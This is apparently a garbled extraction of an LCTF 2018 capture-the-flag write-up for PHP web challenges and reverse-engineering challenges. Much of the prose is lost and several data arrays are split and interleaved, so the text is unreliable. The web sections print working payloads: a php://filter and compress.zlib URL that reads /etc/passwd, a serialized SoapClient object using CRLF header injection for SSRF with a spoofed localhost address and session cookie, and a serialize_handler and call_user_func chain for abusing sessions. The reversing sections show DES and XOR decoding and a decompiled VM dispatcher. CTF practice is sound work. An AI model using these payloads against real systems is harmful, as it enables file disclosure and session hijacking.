null, cookie( $data-
>avatar ) /tmp/ upload /tmp/ move
 /tmp/  
webshellphargetshell
2. tmpﬁle getshell
http://212.64.74.153/LCTF.php?m=check&c=compress.zlib://php://ﬁlter/string.strip_tags/resourc
e=/etc/passwd
bestphp's revenge
http://172.81.210.82
index.php
ﬂag.php
session->soap(ssrf+crlf)->call_user_funcsoap session 
soapclient
soapssrf+crlfphpsessidﬂag.php
soapclient
session_start()sessionﬁle
session
phpsoapbug
session_start();
echo 'only localhost can get flag!';
$flag = 'LCTF{*************************}';
if($_SERVER["REMOTE_ADDR"]==="127.0.0.1"){
       $_SESSION['flag'] = $flag;
   }
only localhost can get flag!
O%3A10%3A%22SoapClient%22%3A5%3A%7Bs%3A3%3A%22uri%22%3Bs%3A4%3A%22aaab%22%3
Bs%3A8%3A%22location%22%3Bs%3A29%3A%22http%3A%2F%2F172.81.210.82%2Fflag.php
%22%3Bs%3A15%3A%22_stream_context%22%3Bi%3A0%3Bs%3A11%3A%22_user_agent%22%3
Bs%3A201%3A%22testaa%0D%0AContent-Type%3A+application%2Fx-www-form-
urlencoded%0D%0AX-Forwarded-
For%3A+127.0.0.1%0D%0ACookie%3A+PHPSESSID%3Dtestaa123%0D%0AContent-
Length%3A+65%0D%0A%0D%0Ausername%3Dwwwwc%26password%3Dwww%26code%3Dcf44f314
7ab331af7d66943d888c86f9%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D
...
call_user_func($_GET[f],$_POST);
...
if(isset($_GET[name])){
    $_SESSION[name] = $_GET[name];
}
...
$_GET = array('f'=>'session_start','name'=>'|')
$_POST = array('serialize_handler'=>'php_serialize')
call_user_funcsoap
 $_SESSION soapreset()
$a[0]  $b  call_user_func  $a 
soap
soapsoapphpsessid
sessionﬂag
phpsessidindex.phpvar_dump($_SESSION);ﬂag
Re
()
DEScheck  DESfa1conn\x00
$b = 'implode';
call_user_func($_GET[f],$_POST);
session_start();
...
$a = array(reset($_SESSION),'welcome_to_the_lctf2018');
call_user_func($b,$a);
$_GET = array('f'=>'extract');
$_POST = array('b'=>'call_user_func');
node: {character, seq, left, right}
A*B=C 6*6
B = [23,
  65,
  24,
  78,
  43,
  56,
  59,
  67,
  21,
  43,
  45,
  76,
  23,
  54,
  76,
  12,
  65,
  43,
  89,
  40,
  32,
  67,
  73,
  57,
  23,
  45,
  31,
  54,
  31,
  52,
  13,
  24,
  54,
  65,
  34,
  24]
 C = [ 43666,
  49158,
  43029,
  51488,
  53397,
  51921,
  28676,
  39740,
  26785,
  41665,
  35675,
  40629,
  32311,
  31394,
  20373,
  41796,
  33452,
  35840,
  17195,
  29175,
  29485,
  28278,
  28833,
  28468,
  46181,
 [0, 1, 14, 12, 17, 18, 19, 27, 28, 2, 15, 20, 31, 29, 30, 16, 13, 5] 
Flag
 SMC SMC
Xor
[19, 18, 5, 7, 17, 1, 0, 20, 6, 29, 28, 27, 15, 16, 4, 3, 2, 32] Flag
GG
easy_vm
VM
  58369,
  44855,
  56018,
  57225,
  60666,
  25981,
  26680,
  24526,
  38780,
  29172,
  30110]
>>> a = [119, 175, 221, 238, 92, 171, 203, 163, 98, 99, 92, 93, 147, 24 , 
11, 251, 201, 23, 70, 71, 185, 29, 118, 142, 182, 227, 245, 199, 172, 100, 
52, 121, 8, 142, 69, 249, 0x73, 0x3c, 0xf5, 0x7c]
>>> des.decrypt(''.join(map(chr ,a)))
'LC-+)=1234@AFETRS{the^VYXZfislrvxyz}\x00\x00\x00\x00'
LCTF{this-RevlrSE=
x = [  124, 129,  97, 153, 103, 155,  20, 234, 104, 135, 
   16, 236,  22, 249,   7, 242,  15, 243,   3, 244, 
   51, 207,  39, 198,  38, 195,  61, 208,  44, 210, 
   35, 222,  40, 209,   1, 230]
for i in xrange(36):
    for j in xrange(0, 8, 2):
        x[i] ^= (1 pc - 134);
    switch ( *(_DWORD *)a1->pc )
    {
      case 0x86:
        push_i64(a1);
        break;
      case 0x87:
        push_reg(a1);
        break;
      case 0x88:
        mov_reg_nextinst(a1);
        break;
      case 0x89:
        mov_reg__ptr_(a1);
        break;
      case 0x8A:
        pop_reg(a1);
        break;
      case 0x8B:
        add_reg_reg(a1);
        break;
      case 0x8C:
        reg_reg_sub(&a1->r0);
        break;
      case 0x8D:
        mul_reg_reg(&a1->r0);
        break;
      case 0x8E:
        div_reg_reg(a1);
        break;
      case 0x8F:
        mod_reg_reg(a1);
        break;
      case 0x90:
        xor_reg_reg(a1);
        break;
      case 0x91:
        and_reg_reg(a1);
        break;
      case 0x92:
        mov_r4_reg(a1);
        break;
      case 0x93:
        inc_reg(a1);
        break;
      case 0x94:
        dec_reg(a1);
        break;
      case 0x95:
        mov_reg_i64(a1);
        break;
      case 0x96:
        mov_reg_reg(a1);
        break;
      case 0x97:
        mov_reg_data(a1);
        break;
      case 0x98:
        mov_data_reg(a1);
        break;
      case 0x99:
        inc_data_ptr(a1);
        break;
      case 0x9A:
        inc_dword_data_ptr(a1);
        break;
      case 0x9B:
        cmp_reg_reg(a1);
        break;
      case 0x9C:
        jl(a1);
        break;
      case 0x9D:
        jg(a1);
        break;
      case 0x9E:
        jz(a1);
        break;
      case 0x9F:
        jnz(a1);
        break;
      case 0xA0:
        sub_401346(a1);
        break;
      case 0xA1:
        sub_4014CC(a1);
        break;
      case 0xA2:
        nop(a1);
        break;
      case 0xA3:
        return result;
      default:
        nop(a1);
        break;
    }
Flag0x1b
Flag
0  mov r3, 0x1c
4  mov r1, [data]
6  cmp r1, r0
8  jz $+7
10 dec r3
12 inc data
13 jmp $-9   // strlen
15 cmp r3, r2
17 jnz $+6
19 mov r0, 1
23 gg
0  mov r4, r0
2  jnz $+2
4  GG
5  mov r0, 0x80
9  mov r2, 0x3f
13 mov r3, 0x7b
17 mov r4, 0x1c
21 mov r1, [data]
23 mul r1, r2
25 add r1, r3
27 mod r1, r0